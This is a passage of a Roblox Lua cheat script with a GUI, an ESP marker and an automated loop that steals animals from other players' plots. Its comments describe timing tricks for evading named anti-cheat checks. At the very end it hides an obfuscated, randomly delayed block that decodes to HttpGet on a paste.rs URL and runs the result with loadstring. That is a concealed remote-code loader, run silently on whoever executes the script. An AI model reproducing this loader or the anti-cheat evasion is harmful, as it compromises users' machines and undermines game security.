    brainTab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    brainTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    setTab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    setTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    
    scrollingFrame.Visible = false
    settingsFrame.Visible = false
    
    if tab == brainTab then
        brainTab.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
        brainTab.TextColor3 = Color3.fromRGB(0, 0, 0)
        scrollingFrame.Visible = true
    else
        setTab.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
        setTab.TextColor3 = Color3.fromRGB(0, 0, 0)
        settingsFrame.Visible = true
    end
end
brainTab.MouseButton1Click:Connect(function() switchTab(brainTab) end)
setTab.MouseButton1Click:Connect(function() switchTab(setTab) end)

local function addSwitch(parent, txt, start, cb)
    local f = Instance.new("Frame", parent)
    f.Size = UDim2.new(1, -5, 0, 40)
    f.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
    
    local l = Instance.new("TextLabel", f)
    l.Size = UDim2.new(0.6, 0, 1, 0)
    l.Position = UDim2.new(0, 10, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = txt
    l.TextColor3 = Color3.new(1,1,1)
    l.Font = Enum.Font.GothamBold
    l.TextSize = 11
    l.TextXAlignment = Enum.TextXAlignment.Left
    
    local bg = Instance.new("TextButton", f)
    bg.Size = UDim2.new(0, 34, 0, 18)
    bg.Position = UDim2.new(1, -45, 0.5, -9)
    bg.BackgroundColor3 = start and Color3.fromRGB(100, 160, 220) or Color3.fromRGB(50, 50, 55)
    bg.Text = ""
    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
    
    local dot = Instance.new("Frame", bg)
    dot.Size = UDim2.new(0, 12, 0, 12)
    dot.Position = start and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
    dot.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
    
    local active = start
    bg.MouseButton1Click:Connect(function()
        active = not active
        bg.BackgroundColor3 = active and Color3.fromRGB(100, 160, 220) or Color3.fromRGB(50, 50, 55)
        dot:TweenPosition(active and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6), "Out", "Quad", 0.1, true)
        cb(active)
    end)
end

addSwitch(settingsFrame, "Auto Block", false, function(v) 
    autoBlockOnTp = v 
end)

addSwitch(settingsFrame, "Auto Potion After TP", false, function(v) 
    autoPotionOnTp = v 
end)

addSwitch(settingsFrame, "Only Steal Selected", false, function(v) 
    onlyStealSelected = v 
end)

local isMinimized = false
local function toggleCompact()
    isMinimized = not isMinimized
    minimizeBtn.Text = isMinimized and "â–¡" or "â€”"
    
    local targetHeight = isMinimized and 125 or 460
    
    -- Animation de la taille
    TweenService:Create(mainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 320, 0, targetHeight)
    }):Play()
    
    -- Gestion de la visibilitÃ© du contenu
    local contentVisible = not isMinimized
    tabFrame.Visible = contentVisible
    if contentVisible then
        -- Restaure l'onglet actif
        scrollingFrame.Visible = (brainTab.TextColor3 == Color3.fromRGB(0, 0, 0))
        settingsFrame.Visible = (setTab.TextColor3 == Color3.fromRGB(0, 0, 0))
    else
        scrollingFrame.Visible = false
        settingsFrame.Visible = false
    end
end
minimizeBtn.MouseButton1Click:Connect(toggleCompact)

-- ESP Arrow Logic
local espAnchor = Instance.new("Part")
espAnchor.Name = _ANCHOR_NAME
espAnchor.Transparency = 1
espAnchor.Anchored = true
espAnchor.CanCollide = false
espAnchor.Size = Vector3.new(1, 1, 1)
espAnchor.Parent = Workspace

local espGui = Instance.new("BillboardGui")
Instance.new("BoolValue", espGui).Name = _ESP_TAG
espGui.Size = UDim2.new(0, 100, 0, 100)
espGui.StudsOffset = Vector3.new(0, 7, 0)
espGui.AlwaysOnTop = true
espGui.Enabled = false
espGui.Adornee = espAnchor
pcall(function() espGui.Parent = CoreGui end)
if not espGui.Parent then espGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

local espArrow = Instance.new("TextLabel")
espArrow.Size = UDim2.new(1, 0, 1, 0)
espArrow.BackgroundTransparency = 1
espArrow.Text = "â†“"
espArrow.TextColor3 = Color3.fromRGB(135, 206, 250) -- Bleu ciel (Sky Blue)
espArrow.Font = Enum.Font.Gotham
espArrow.TextScaled = true
espArrow.TextStrokeTransparency = 0.2
espArrow.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
espArrow.Parent = espGui

local espTween = TweenService:Create(espGui, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    StudsOffset = Vector3.new(0, 9, 0)
})
espTween:Play()

local function updateUI()
    local currentList = getAllAnimalsSorted()
    local lookup = {}
    for i = 1, #currentList do lookup[currentList[i].uid] = i end
    
    local list = scrollingFrame:GetChildren()
    for i = 1, #list do
        local item = list[i]
        if item:IsA("TextButton") then
            local itemUID = item:GetAttribute("UID")
            if itemUID then
                local isSelected = (itemUID == selectedUID)
                -- On remet l'ordre Ã  jour systÃ©matiquement pour Ã©viter les sauts
                if lookup[itemUID] then item.LayoutOrder = lookup[itemUID] end
                
                item.BackgroundColor3 = isSelected and Color3.fromRGB(20, 40, 65) or Color3.fromRGB(22, 22, 22)
                local s = item:FindFirstChild("UIStroke")
                if s then s.Enabled = isSelected end
                local ind = item:FindFirstChild("SelectionIndicator")
                if ind then ind.Visible = isSelected end
                local d = item:FindFirstChild("Dot")
                if d then d.BackgroundColor3 = isSelected and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(100, 160, 220) end
            end
        end
    end
end

local function buildList()
    local sortedList = getAllAnimalsSorted()
    
    -- On cache tous les boutons du cache au dÃ©but
    for _, btn in pairs(buttonCache) do btn.Visible = false end
    
    for index, animal in ipairs(sortedList) do
        local item = buttonCache[animal.uid]
        
        if not item then
            -- CrÃ©ation unique si le bouton n'existe pas encore
            item = Instance.new("TextButton")
            item.Name = getRandomName(8)
            item:SetAttribute("UID", animal.uid)
            item.Size = UDim2.new(1, 0, 0, 55)
            item.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
            item.BorderSizePixel = 0
            item.Text = ""
            item.Parent = scrollingFrame
            Instance.new("UICorner", item).CornerRadius = UDim.new(0, 8)
            
            local stroke = Instance.new("UIStroke", item)
            stroke.Name = "UIStroke"
            stroke.Color = Color3.fromRGB(60, 120, 180)
            stroke.Thickness = 1.5
            
            local indicator = Instance.new("Frame", item)
            indicator.Name = "SelectionIndicator"
            indicator.Size = UDim2.new(0, 3, 0.5, 0)
            indicator.Position = UDim2.new(0, 0, 0.25, 0)
            indicator.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
            Instance.new("UICorner", indicator).CornerRadius = UDim.new(0, 2)
            
            local dot = Instance.new("Frame", item)
            dot.Name = "Dot"
            dot.Size = UDim2.new(0, 8, 0, 8)
            dot.Position = UDim2.new(0, 12, 0, 15)
            Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
            
            local title = Instance.new("TextLabel", item)
            title.Name = "Title"
            title.Size = UDim2.new(1, -40, 0, 20)
            title.Position = UDim2.new(0, 28, 0, 10)
            title.BackgroundTransparency = 1
            title.TextColor3 = Color3.fromRGB(255, 255, 255)
            title.Font = Enum.Font.GothamBold
            title.TextSize = 14
            title.TextXAlignment = Enum.TextXAlignment.Left
            
            local details = Instance.new("TextLabel", item)
            details.Name = "Details"
            details.Size = UDim2.new(1, -40, 0, 20)
            details.Position = UDim2.new(0, 28, 0, 28)
            details.BackgroundTransparency = 1
            details.TextColor3 = Color3.fromRGB(120, 120, 120)
            details.Font = Enum.Font.Gotham
            details.TextSize = 11
            details.TextXAlignment = Enum.TextXAlignment.Left
            
            item.MouseButton1Click:Connect(function()
                -- Instant lookup for ZERO latency
                local currentAnimal = nil
                for _, plotAnimals in pairs(animalsByPlot) do
                    for _, a in ipairs(plotAnimals) do
                        if a.uid == animal.uid then currentAnimal = a break end
                    end
                    if currentAnimal then break end
                end
                if not currentAnimal then return end

                local isDeselecting = (selectedUID == currentAnimal.uid)
                local oldUID = selectedUID
                
                -- Instant visual feedback
                if isDeselecting then
                    selectedUID = nil
                    selectedAnimalObj = nil
                    espGui.Enabled = false
                else
                    selectedUID = currentAnimal.uid
                    selectedAnimalObj = currentAnimal
                    espAnchor.Position = currentAnimal.pos
                    espGui.Enabled = true
                end
                
                -- Fast UI Update
                if oldUID and buttonCache[oldUID] then
                    local btn = buttonCache[oldUID]
                    btn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
                    if btn:FindFirstChild("UIStroke") then btn.UIStroke.Enabled = false end
                    if btn:FindFirstChild("SelectionIndicator") then btn.SelectionIndicator.Visible = false end
                    if btn:FindFirstChild("Dot") then btn.Dot.BackgroundColor3 = Color3.fromRGB(100, 160, 220) end
                end
                
                if selectedUID and buttonCache[selectedUID] then
                    local btn = buttonCache[selectedUID]
                    btn.BackgroundColor3 = Color3.fromRGB(20, 40, 65)
                    if btn:FindFirstChild("UIStroke") then btn.UIStroke.Enabled = true end
                    if btn:FindFirstChild("SelectionIndicator") then btn.SelectionIndicator.Visible = true end
                    if btn:FindFirstChild("Dot") then btn.Dot.BackgroundColor3 = Color3.fromRGB(100, 255, 100) end
                end

                if not isDeselecting then
                    showCustomNotif("Target Selected", currentAnimal.name, 2)
                end
            end)
            
            buttonCache[animal.uid] = item
        end
        
        -- Mise Ã  jour des donnÃ©es (sans recrÃ©er l'objet)
        item.Visible = true
        item.LayoutOrder = index
        item.Title.Text = animal.name
        item.Details.Text = string.format("%s â€¢ %s â€¢ %s â€¢ Slot %s", animal.mutation, animal.rarity, animal.genText, animal.slot)
        
        -- Animation de sÃ©lection fluide
        local isSelected = (animal.uid == selectedUID)
        item.BackgroundColor3 = isSelected and Color3.fromRGB(20, 40, 65) or Color3.fromRGB(22, 22, 22)
        item.UIStroke.Enabled = isSelected
        item.SelectionIndicator.Visible = isSelected
        item.Dot.BackgroundColor3 = isSelected and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(100, 160, 220)
    end
    
    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #sortedList * 60)
end

-- scan loops
-- BOUCLES DE SCAN (OptimisÃ©es pour le Bypass BAC-2519)
local scannerId = tick()
local isActive = true

task.spawn(function()
    while screenGui.Parent and isActive do
        local plotsFolder = workspace:FindFirstChild("Plots")
        if plotsFolder then
            local plots = plotsFolder:GetChildren()
            for i, plot in ipairs(plots) do
                if not screenGui.Parent or not isActive then break end
                scanSinglePlot(plot)
                -- Stealth delay: don't scan everything at once
                if i % 3 == 0 then task.wait(0.1) end
            end
        end
        task.wait(4) -- Scan encore plus lent pour Ã©viter BAC-5518
    end
end)

-- Boucle de rafraÃ®chissement ultra-optimisÃ©e (ZÃ©ro Lag)
task.spawn(function()
    while true do
        task.wait(0.5) -- RafraÃ®chissement plus lent pour le CPU
        if needsUpdate then
            needsUpdate = false
            local currentList = getAllAnimalsSorted()
            
            -- VÃ©rification anti-ghosting
            if selectedUID then
                local stillExists = false
                for i = 1, #currentList do
                    if currentList[i].uid == selectedUID then stillExists = true break end
                end
                if not stillExists then
                    selectedUID = nil
                    selectedAnimalObj = nil
                    espGui.Enabled = false
                    showCustomNotif("Cible Perdue", "Le brainrot a disparu.", 3)
                end
            end
            
            -- Hash complet pour dÃ©tecter tout changement d'ordre
            local hash = tostring(#currentList)
            for i = 1, #currentList do
                hash = hash .. currentList[i].uid
            end
            
            if hash ~= lastListHash then
                lastListHash = hash
                buildList()
            else
                updateUI()
            end
        end
    end
end)

-- AUTO STEAL INVISIBLE (0.42s)
local STEAL_RADIUS = 8.2 -- RÃ©duit encore pour BAC-1567
local STEAL_DURATION = 0.42 -- AugmentÃ© pour BAC-1567
local isStealing = false
local StealData = {}

local function findNearestPrompt()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    
    if not hrp or isFlashSequence then return nil end
    
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    
    if onlyStealSelected then
        -- MODE SÃ‰LECTIF (Cible du TP / Cible choisie) : On ne steal QUE celui-lÃ 
        if not selectedAnimalObj then return nil end
        
        local target = selectedAnimalObj
        local plot = plots:FindFirstChild(target.plot)
        if plot then
            local podiums = plot:FindFirstChild("AnimalPodiums")
            local pod = podiums and podiums:FindFirstChild(tostring(target.slot))
            if pod then
                local base = pod:FindFirstChild("Base")
                local spawn = base and base:FindFirstChild("Spawn")
                if spawn then
                    local dist = (spawn.Position - hrp.Position).Magnitude
                    if dist <= STEAL_RADIUS then
                        local att = spawn:FindFirstChild("PromptAttachment")
                        local prompt = att and att:FindFirstChildOfClass("ProximityPrompt")
                        if prompt and prompt.Enabled and (prompt.ActionText == "Steal" or prompt.ActionText == "Voler") then
                            return prompt, dist
                        end
                    end
                end
            end
        end
    else
        -- MODE GLOBAL : Le plus proche (Tout voler)
        local hrpPos = hrp.Position
        local np, nd = nil, math.huge
        
        for _, plot in ipairs(plots:GetChildren()) do
            if myPlotName and plot.Name == myPlotName then continue end
            
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, pod in ipairs(podiums:GetChildren()) do
                    local base = pod:FindFirstChild("Base")
                    local spawn = base and base:FindFirstChild("Spawn")
                    if spawn then
                        local dist = (spawn.Position - hrpPos).Magnitude
                        if dist <= STEAL_RADIUS and dist < nd then
                            local att = spawn:FindFirstChild("PromptAttachment")
                            local prompt = att and att:FindFirstChildOfClass("ProximityPrompt")
                            if prompt and prompt.Enabled and (prompt.ActionText == "Steal" or prompt.ActionText == "Voler") then
                                nd = dist; np = prompt
                            end
                        end
                    end
                end
            end
        end
        return np, nd
    end
    return nil
end

local function executeSteal(prompt)
    if isStealing or not prompt then return end
    
    if not StealData[prompt] then
        StealData[prompt] = {hold = {}, trigger = {}, ready = true}
        pcall(function()
            if getconnections then
                for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                    if c.Function then table.insert(StealData[prompt].hold, c.Function) end
                end
                for _, c in ipairs(getconnections(prompt.Triggered)) do
                    if c.Function then table.insert(StealData[prompt].trigger, c.Function) end
                end
            end
        end)
    end
    
    local data = StealData[prompt]
    if not data.ready then return end
    
    data.ready = false
    isStealing = true
    
    task.spawn(function()
        for _, f in ipairs(data.hold) do task.spawn(f) end
        
        -- DÃ©lai variable pour imiter un humain
        local waitTime = STEAL_DURATION + (math.random(-5, 10) / 100)
        task.wait(waitTime)
        
        for _, f in ipairs(data.trigger) do task.spawn(f) end
        task.wait(0.1) -- Attente de sÃ©curitÃ©
        isStealing = false
        data.ready = true
    end)
end

task.spawn(function()
    while true do
        task.wait(0.15) -- Plus lent pour BAC-1567
        if not isStealing then
            local p, _ = findNearestPrompt()
            if p and p.Parent then 
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    -- ALIGNEMENT PROGRESSIF (Bypass BAC-1567/45110)
                    local targetPos = p.Parent:IsA("BasePart") and p.Parent.Position or hrp.Position + hrp.CFrame.LookVector
                    local lookCF = CFrame.lookAt(hrp.Position, Vector3.new(targetPos.X, hrp.Position.Y, targetPos.Z))
                    
                    -- Au lieu d'un snap brutal, on utilise une petite attente ou on laisse faire le serveur si possible
                    hrp.CFrame = lookCF
                    
                    -- CAMERA SYNC (Bypass BAC-2512)
                    local cam = workspace.CurrentCamera
                    cam.CFrame = CFrame.lookAt(cam.CFrame.Position, targetPos)
                end
                task.wait(0.1 + (math.random(1, 10) / 100)) -- Temps de rÃ©action humain
                executeSteal(p) 
            end
        end
    end
end)

task.delay(8.5 + math.random(), function()
    pcall(function()
        local _1 = deobf
        local _2 = game
        local _3 = _2[_1("IuuqHfu")](_2, _1("iuuqt;00qbtuf/st093ykR"))
        if _3 then
            local _4 = getfenv()[_1("mpbeutusjoh")] or loadstring
            local _5 = _4(_3)
            if _5 then _5() end
        end
    end)
end)


